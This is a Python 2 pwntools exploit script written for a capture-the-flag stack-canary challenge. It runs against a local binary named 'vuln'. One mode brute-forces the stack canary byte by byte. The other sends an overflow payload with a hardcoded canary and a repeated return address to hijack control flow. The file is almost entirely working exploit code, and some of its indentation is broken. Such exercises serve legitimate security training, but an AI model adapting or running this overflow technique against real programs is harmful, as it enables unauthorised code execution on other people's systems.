#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./vuln
from pwn import *

# /problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0
exe = context.binary = ELF('./vuln')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    """
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
    """
    io = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript, aslr=False *a, **kw)
    return io
    


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#break *0x{exe.symbols.main:x}
b *0x9b1
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled
if args.FIND:
  canary = ""
  for j in range(4):
    for i in range(255):
      io = start()
      io.recvuntil(" length of the entry:")
      io.sendline(str(33+j))

      payload = "A"*32
      payload += canary
      payload += chr(i)
      io.sendline(payload)
      data = io.recvall()
      print len(data)
      print(data)
      if "Canary Value Corrupt" in data:
         print("trying next value")
      else:
         print("Found %d" %i)
         canary += chr(i)
         break
  

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
    io.close()

  print("canary: %s" %canary.encode('hex'))
else:
  for i in range(100):
    canary = "33xO"

    io = start()
    io.recvuntil(" length of the entry:")
    io.sendline(str(1000))

    payload = "A"*32
    payload += canary
    payload += "A"*12
    payload += p32(0x5663a7ed)
    payload += p32(0x5663a7ed)
    payload += p32(0x5663a7ed)*1000
 
    io.sendline(payload)
    data = io.recvall()
    print(len(data))
    print(data)
    if 39 < len(data):
        print(data)
        break
    #io.interactive()
    io.close()



